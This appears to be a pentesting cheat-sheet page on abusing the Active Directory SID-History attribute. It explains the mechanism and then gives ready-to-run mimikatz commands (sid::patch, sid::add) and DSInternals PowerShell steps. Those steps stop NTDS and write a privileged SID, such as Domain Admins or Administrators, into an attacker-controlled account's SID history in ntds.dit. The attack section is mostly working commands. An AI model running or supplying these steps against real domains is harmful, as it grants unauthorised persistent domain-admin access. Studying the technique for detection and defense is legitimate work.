## Theory
The SID (Security Identifier) is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.

The SID history is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

This mechanism can also be abused as a means of persistence: adding the SID of a privileged account or group to the SID-History attribute of a controlled account grants rights associated with account/group of which the SID is added.

For instance, the SID of an account with Domain Admin rights can be added to a normal user SID History to grant them Domain Admin rights (the rights would not be granted per say, but the modified account would be treated as domain admin when checking rights).

## Explott
1. Pre-windows 2016

Modifying the SID History attribute of an object can be done using mimikatz, with the `sid::patch, sid::add and sid::lookup `scommands.
```bash
# Generic command
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:UserRecievingTheSID /new:SIDOfTheTargetedUserOrGroup"

# Example 1 : Use this command to inject the SID of built-in administrator account to the SID-History attribute of AttackerUser
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:Builtin\administrators "

# Example 2 : Use sid::lookup to retrieve the SID of an account and inject it to the SID-History attribute of AttackerUser
mikikatz.exe "sid::lookup /name:InterestingUser"
mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:SIDOfInterestingUser"
```
2. Post-Windows 2016
The only known way to add a SID to the SID History attribute of an account on a Windows domain controller 2016 and above is to use the Powershell module [DSInternals]. This method also works for Pre-Windows 2016 domain controllers.
```bash
# Install DSInternals on the domain controller
Install-Module -Name DSInternals

# Find the account SID you want to inject
Get-ADUser -Identity $InterestingUser

# Stop the NTDS service
Stop-service NTDS -force

# Inject the SID into the SID History attribute
Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit

# Start the NTDS service
Start-service NTDS
```